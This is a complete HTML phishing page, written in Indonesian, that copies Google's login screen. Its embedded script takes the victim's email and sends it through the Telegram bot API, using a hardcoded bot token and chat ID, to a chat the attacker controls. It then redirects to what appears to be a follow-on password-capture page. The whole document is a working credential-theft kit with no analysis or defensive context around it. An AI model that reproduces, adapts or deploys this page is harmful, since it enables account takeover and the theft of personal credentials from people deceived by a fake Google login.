<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Google</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            font-family: 'Google Sans', Arial, sans-serif;
            background-color: #fff;
            height: 100vh;
            overflow-y: hidden;
        }
        .login-container {
            max-width: 450px;
            margin: 0 auto;
            padding: 48px 40px 36px;
        }
        .google-logo {
            height: 24px;
            margin-bottom: 24px;
        }
        .login-title {
            color: #202124;
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 16px;
        }
        .login-subtitle {
            color: #202124;
            font-size: 16px;
            font-weight: 400;
            margin-bottom: 32px;
        }
        .form-control {
            height: 54px;
            border-radius: 4px;
            border: 1px solid #dadce0;
            padding: 13px 15px;
            font-size: 16px;
        }
        .form-control:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px #e8f0fe;
        }
        .error-message {
            color: #d93025;
            font-size: 12px;
            margin-top: 8px;
            display: none;
        }
        .btn-next {
            background-color: #1a73e8;
            color: white;
            padding: 0 24px;
            height: 36px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
        }
        .btn-next:hover {
            background-color: #1557b0;
            color: white;
        }
        .bottom-links {
            margin-top: 12px;
        }
        .bottom-links a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .learn-more {
            color: #5f6368;
            font-size: 14px;
            margin-bottom: 32px;
        }
        .learn-more a {
            color: #1a73e8;
            text-decoration: none;
        }
        .btn-next {
            position: relative;
            top: 40px;
            margin-left: 125px;
        }
        a.me-3 {
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-container">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="google-logo">
            <h1 class="login-title">Login</h1>
            <p class="login-subtitle">Gunakan Akun Google Anda</p>
            <p class="learn-more">
                Akun akan ditambahkan ke perangkat ini dan tersedia untuk aplikasi Google lainnya.
                <a href="#">Pelajari lebih lanjut</a>
            </p>
            
            <form id="loginForm">
                <div class="mb-4">
                    <input type="text" class="form-control" id="emailInput" placeholder="Email atau nomor telepon">
                    <div class="error-message" id="errorMessage">
                        Masukkan email atau nomor telepon
                    </div>
                </div>
                
                <div class="justify-content-between align-items-center">
                    <div>
                        <a href="#" class="me-3">Lupa email?</a>
                    </div>
                    <button type="submit" class="btn btn-next">Selanjutnya</button>
                </div>
                
                <div class="bottom-links">
                    <a href="#">Buat akun</a>
                </div>
            </form>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
  document.getElementById("loginForm").addEventListener("submit", function(event) {
  event.preventDefault(); // Mencegah form melakukan submit default

  let email = document.getElementById("emailInput").value.trim();
  let errorMessage = document.getElementById("errorMessage");

  if (!email) {
    errorMessage.style.display = "block";
    return;
  } else {
    errorMessage.style.display = "none";
  }

  sendToTelegram(email);
});

function sendToTelegram(email) {
  const token = '7570919901:AAFjLjwD0H26KM62955Vnxuy2C1M9G8p-c'; // Ganti dengan token bot Telegram Anda
  const chatId = '7681252717'; // Ganti dengan chat ID tujuan

  const message = `ðŸ”” Login Attempt:\nðŸ“§ Email: ${email}`;
  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message })
    })
    .then(response => response.json())
    .then(data => {
      if (data.ok) {
        console.log('Pesan berhasil dikirim:', data);

        // Simpan email ke sessionStorage (lebih aman dibanding localStorage)
        sessionStorage.setItem('userEmail', email);

        // Redirect ke halaman password
        window.location.href = 'kata-sandi-email.html';
      } else {
        console.error('Gagal mengirim pesan:', data);
        alert("Terjadi kesalahan. Coba lagi nanti.");
      }
    })
    .catch(error => {
      console.error('Gagal mengirim pesan:', error);
      alert("Gagal menghubungi server. Periksa koneksi internet Anda.");
    });
}
</script>
</body>
</html>
